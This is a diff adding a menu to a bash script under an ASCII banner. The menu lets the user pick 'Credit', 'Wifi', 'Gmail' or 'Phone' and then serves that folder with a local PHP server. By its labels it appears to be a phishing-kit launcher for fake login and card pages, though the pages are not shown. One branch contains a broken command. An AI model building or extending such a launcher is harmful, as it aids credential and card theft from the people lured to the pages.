@@ -14,3 +14,33 @@ echo -e "$grn █▒▒▄▄▒▒▒▒▄▄▄▄▒▒█▒▒▄▄▒▒
 echo -e "$grn █▒▒▄▄▄▄▄▄▄▄▒▒▒▒█▒▒▄▄▄▄▄▄▄▄▄▄▒▒█▒▒▄▄▒▒██▒▒▄▄▒▒█▒▒▄▄▄▄▄▄▄▄▒▒▒▒█▒▒▄▄▄▄▄▄▄▄▄▄▒▒█▒▒▄▄▄▄▄▄▄▄▄▄▒▒█▒▒▄▄▄▄▄▄▄▄▄▄▒▒$rset"
 echo -e "$grn █▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒$rset"
 echo -e "$grn █████████████████████████████████████████████████████████████████████████████████████████████████████████$rset"                  
+
+# Option
+select number in Credit Wifi Gmail Phone Exit 
+do
+
+case $number in
+# Choose
+"Credit")
+cd credit
+php -S localhost:8000
+;;
+"Wifi")
+cd Wifi
+php -S localhost:8000
+;;
+"Gmail")
+cd Gmail
+php-S localhost:8000
+;;
+"Phone")
+cd Phone
+php -S localhost:8000
+;;
+# Exit
+"Exit")
+echo "Thanks for using this tool :)"
+break
+;;
+esac
+done
